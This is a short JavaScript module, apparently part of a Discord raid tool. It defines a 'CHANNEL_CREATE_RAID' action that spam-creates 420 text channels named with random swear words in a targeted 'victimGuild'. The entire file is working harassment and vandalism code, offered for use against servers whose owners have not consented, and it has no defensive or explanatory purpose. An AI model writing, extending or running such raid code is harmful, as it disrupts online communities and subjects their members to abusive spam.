import { Log, randomFrom, spinner } from './../utils/index.js';
import chalk from 'chalk';
import swearWords from 'badwords/array.js';
const channelCreateRaid = {
    name: 'CHANNEL_CREATE_RAID',
    id: 4,
    permission: 'MANAGE_CHANNELS',
    async execute(victimGuild) {
        const _spinner = spinner('Spam-creating channels').start();
        for (let i = 0; i < 420; i++) {
            await victimGuild.channels.create(randomFrom(swearWords), {
                type: 'GUILD_TEXT',
            });
            _spinner.text = `Spam-creating channels - [${i}]`;
        }
        _spinner.stop();
        Log.success(`Created ${chalk.bold('420')} channels`);
    },
};
export default channelCreateRaid;
